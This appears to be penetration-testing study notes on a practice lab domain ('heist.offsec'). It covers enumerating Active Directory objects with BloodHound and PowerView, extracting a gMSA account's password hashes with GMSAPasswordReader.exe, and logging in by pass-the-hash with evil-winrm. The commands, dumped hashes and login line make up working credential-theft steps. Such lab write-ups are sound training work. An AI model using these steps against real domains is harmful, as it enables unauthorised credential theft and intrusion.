# Enumerating Objects

## Example

In this page we'll cover some enumeration TTP's that we can use to further understand the active directory objects in the domain we're working with.

## Reviewing Bloodhound

Once we load data into bloodhound we can get a map of the users on the domain we want to target, this often gives us valuable information on intersting objects we want to enumerate further

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This shows that the **svc\_apache** service account can read the GMSA password, which means that the **svc\_apache** account is a Group Managed Service Account (gMSA).

<mark style="color:red;">**NOTE:**</mark> Group managed service accounts (gMSAs) are managed domain accounts that you use to help secure services. Password management for that account is handled by the Windows operating system.

{% embed url="https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview" %}

### Confirm GMSA is enabled

We can confirm that the user svc\_apache service account has GMSA enabled.

```powershell
PS C:\Users\enox> Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}


DistinguishedName : CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
Enabled           : True
Name              : svc_apache
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : d40bc264-0c4e-4b86-b3b9-b775995ba303
SamAccountName    : svc_apache$
SID               : S-1-5-21-537427935-490066102-1511301751-1105
UserPrincipalName :

```

The following command provides info about which groups have permissions to retrieve the password for the svc\_apache service account:

```powershell
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames


CN                                         : svc_apache
DNSHostName                                : DC01.heist.offsec
DistinguishedName                          : CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
MemberOf                                   : {CN=Remote Management Users,CN=Builtin,DC=heist,DC=offsec}
Created                                    : 7/20/2021 4:23:44 AM
LastLogonDate                              : 9/14/2021 8:27:06 AM
PasswordLastSet                            : 7/20/2021 4:23:44 AM
msDS-ManagedPasswordInterval               : 30
PrincipalsAllowedToDelegateToAccount       : {}
PrincipalsAllowedToRetrieveManagedPassword : {CN=DC01,OU=Domain Controllers,DC=heist,DC=offsec, CN=Web Admins,CN=Users,DC=heist,DC=offsec}
ServicePrincipalNames                      :




```

We see under <mark style="color:yellow;">**PrincipalsAllowedToRetrieveManagedPassword**</mark> we see the group "Web Admins" let's enumerate this group further.

### Review Domain Group "Web Admins" PowerView

Let's find the domain members in "Web Admins" with PowerView

```powershell
PS> Get-DomainGroupMember "Web Admins"



GroupDomain             : heist.offsec
GroupName               : Web Admins
GroupDistinguishedName  : CN=Web Admins,CN=Users,DC=heist,DC=offsec
MemberDomain            : heist.offsec
MemberName              : enox
MemberDistinguishedName : CN=Naqi,CN=Users,DC=heist,DC=offsec
MemberObjectClass       : user
MemberSID               : S-1-5-21-537427935-490066102-1511301751-1103



```

We can see that our current user: "enox" can extract passwords! This means once  we extract we can login to apache\_svc.



### **Extracting the gMSA Password Using GMSAPasswordReader.exe**&#x20;

We can use [GMSAPasswordReader.exe](https://github.com/expl0itabl3/Toolies) to retrieve the gMSA password with our current user.

```powershell
.\GMSAPasswordReader.exe --accountname 'svc_apache'

Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 526C435B8E4CF11F447D6EF7152665BB
[*]       aes128_cts_hmac_sha1 : 19565C12FDE19AD1033BA3BBD56DD230
[*]       aes256_cts_hmac_sha1 : 43F6DECE6269A588687ACFF41F633A0F7AA9C3FBC7FEAB8BE6981854C19FE817
[*]       des_cbc_md5          : 4AEA91DCEF918F29

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 83AC7FECFBF44780E3AAF5D04DD368A5
[*]       aes128_cts_hmac_sha1 : 08E643C43F775FAC782EDBB04DD40541
[*]       aes256_cts_hmac_sha1 : 588C2BB865E771ECAADCB48ECCF4BCBCD421BF329B0133A213C83086F1A2E3D7
[*]       des_cbc_md5          : 9E340723700454E9

```

<mark style="color:red;">NOTE:</mark> rc4\_hmac is the same as the nt hash.



### Login to svc\_apache with credentials

DONT FORGET THE $ IN THE USERNAME! ANYTIME YOU SEE THIS YOU MUST ADD IT!

```shell-session
evil-winrm -i 192.168.191.165 -u svc_apache$ -H 83AC7FECFBF44780E3AAF5D04DD368A5 
```
